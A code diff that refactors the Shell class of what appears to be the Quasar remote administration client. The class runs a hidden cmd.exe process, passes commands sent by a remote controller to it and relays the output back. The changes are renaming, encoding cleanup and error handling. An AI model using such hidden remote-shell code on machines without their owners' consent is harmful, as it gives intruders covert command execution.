@@ -1,10 +1,10 @@
-﻿using System;
+﻿using Quasar.Common.Messages;
+using System;
 using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Text;
 using System.Threading;
-using Quasar.Common.Messages;
 
 namespace Quasar.Client.Utilities
 {
@@ -14,7 +14,7 @@ namespace Quasar.Client.Utilities
     public class Shell : IDisposable
     {
         /// <summary>
-        /// The Process of the command-line.
+        /// The process of the command-line (cmd).
         /// </summary>
         private Process _prc;
 
@@ -47,7 +47,7 @@ namespace Quasar.Client.Utilities
         private StreamWriter _inputWriter;
 
         /// <summary>
-        /// Creates a new session of the Shell
+        /// Creates a new session of the shell.
         /// </summary>
         private void CreateSession()
         {
@@ -56,7 +56,7 @@ namespace Quasar.Client.Utilities
                 _read = true;
             }
 
-            CultureInfo cultureInfo = CultureInfo.InstalledUICulture;
+            var cultureInfo = CultureInfo.InstalledUICulture;
             _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);
 
             _prc = new Process
@@ -64,36 +64,32 @@ namespace Quasar.Client.Utilities
                 StartInfo = new ProcessStartInfo("cmd")
                 {
                     UseShellExecute = false,
+                    CreateNoWindow = true,
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     StandardOutputEncoding = _encoding,
                     StandardErrorEncoding = _encoding,
-                    CreateNoWindow = true,
                     WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
-                    Arguments = "/K"
+                    Arguments = $"/K CHCP {_encoding.CodePage}"
                 }
             };
-
             _prc.Start();
 
-            // Fire up the logic to redirect the outputs and handle them.
-            RedirectOutputs();
-
-            // Change console code page
-            ExecuteCommand("chcp " + _encoding.CodePage);
+            RedirectIO();
 
             Program.ConnectClient.Send(new DoShellExecuteResponse
             {
-                Output = Environment.NewLine + ">> New Session created" + Environment.NewLine
+                Output = "\n>> New Session created\n"
             });
         }
 
         /// <summary>
-        /// Starts the redirection of input and output
+        /// Starts the redirection of input and output.
         /// </summary>
-        private void RedirectOutputs()
+        private void RedirectIO()
         {
+            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
             ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
             ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
         }
@@ -108,9 +104,9 @@ namespace Quasar.Client.Utilities
         {
             lock (_readStreamLock)
             {
-                StringBuilder streambuffer = new StringBuilder();
+                var streamBuffer = new StringBuilder();
 
-                streambuffer.Append((char)firstCharRead);
+                streamBuffer.Append((char)firstCharRead);
 
                 // While there are more characters to be read
                 while (streamReader.Peek() > -1)
@@ -119,34 +115,32 @@ namespace Quasar.Client.Utilities
                     var ch = streamReader.Read();
 
                     // Accumulate the characters read in the stream buffer
-                    streambuffer.Append((char)ch);
+                    streamBuffer.Append((char)ch);
 
                     if (ch == '\n')
-                        SendAndFlushBuffer(ref streambuffer, isError);
+                        SendAndFlushBuffer(ref streamBuffer, isError);
                 }
                 // Flush any remaining text in the buffer
-                SendAndFlushBuffer(ref streambuffer, isError);
+                SendAndFlushBuffer(ref streamBuffer, isError);
             }
         }
 
         /// <summary>
         /// Sends the read output to the Client.
         /// </summary>
-        /// <param name="textbuffer">Contains the contents of the output.</param>
+        /// <param name="textBuffer">Contains the contents of the output.</param>
         /// <param name="isError">True if reading from the error-stream, else False.</param>
-        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
+        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
         {
-            if (textbuffer.Length == 0) return;
+            if (textBuffer.Length == 0) return;
 
-            var text = textbuffer.ToString();
-            byte[] utf8Text = Encoding.Convert(_encoding, Encoding.UTF8, _encoding.GetBytes(text));
-            var toSend = Encoding.UTF8.GetString(utf8Text);
+            var toSend = ConvertEncoding(_encoding, textBuffer.ToString());
 
             if (string.IsNullOrEmpty(toSend)) return;
 
             Program.ConnectClient.Send(new DoShellExecuteResponse {Output = toSend, IsError = isError});
 
-            textbuffer.Length = 0;
+            textBuffer.Clear();
         }
 
         /// <summary>
@@ -183,9 +177,7 @@ namespace Quasar.Client.Utilities
                 {
                     Program.ConnectClient.Send(new DoShellExecuteResponse
                     {
-                        Output = string.Format(
-                            "{0}>> Session unexpectedly closed{0}",
-                            Environment.NewLine),
+                        Output = "\n>> Session unexpectedly closed\n",
                         IsError = true
                     });
 
@@ -228,9 +220,7 @@ namespace Quasar.Client.Utilities
                 {
                     Program.ConnectClient.Send(new DoShellExecuteResponse
                     {
-                        Output = string.Format(
-                            "{0}>> Session unexpectedly closed{0}",
-                            Environment.NewLine),
+                        Output = "\n>> Session unexpectedly closed\n",
                         IsError = true
                     });
 
@@ -247,30 +237,38 @@ namespace Quasar.Client.Utilities
         public bool ExecuteCommand(string command)
         {
             if (_prc == null || _prc.HasExited)
-                CreateSession();
-
-            if (_prc == null) return false;
-
-            if (_inputWriter == null)
             {
-                _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
+                try
+                {
+                    CreateSession();
+                }
+                catch (Exception ex)
+                {
+                    Program.ConnectClient.Send(new DoShellExecuteResponse
+                    {
+                        Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
+                        IsError = true
+                    });
+                    return false;
+                }
             }
 
-            byte[] rawCommand = Encoding.Convert(Encoding.UTF8, _encoding, Encoding.UTF8.GetBytes(command));
-            string fixedEncodedCommand = _encoding.GetString(rawCommand);
-
-            _inputWriter.WriteLine(fixedEncodedCommand);
+            _inputWriter.WriteLine(ConvertEncoding(_encoding, command));
             _inputWriter.Flush();
 
             return true;
         }
 
         /// <summary>
-        /// Constructor, creates a new session.
+        /// Converts the encoding of an input string to UTF-8 format.
         /// </summary>
-        public Shell()
+        /// <param name="sourceEncoding">The source encoding of the input string.</param>
+        /// <param name="input">The input string.</param>
+        /// <returns>The input string in UTF-8 format.</returns>
+        private string ConvertEncoding(Encoding sourceEncoding, string input)
         {
-            CreateSession();
+            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
+            return Encoding.UTF8.GetString(utf8Text);
         }
 
         /// <summary>
@@ -292,7 +290,8 @@ namespace Quasar.Client.Utilities
                     _read = false;
                 }
 
-                if (_prc == null) return;
+                if (_prc == null)
+                    return;
 
                 if (!_prc.HasExited)
                 {
@@ -304,8 +303,13 @@ namespace Quasar.Client.Utilities
                     {
                     }
                 }
-                _inputWriter.Close();
-                _inputWriter = null;
+
+                if (_inputWriter != null)
+                {
+                    _inputWriter.Close();
+                    _inputWriter = null;
+                }
+
                 _prc.Dispose();
                 _prc = null;
             }
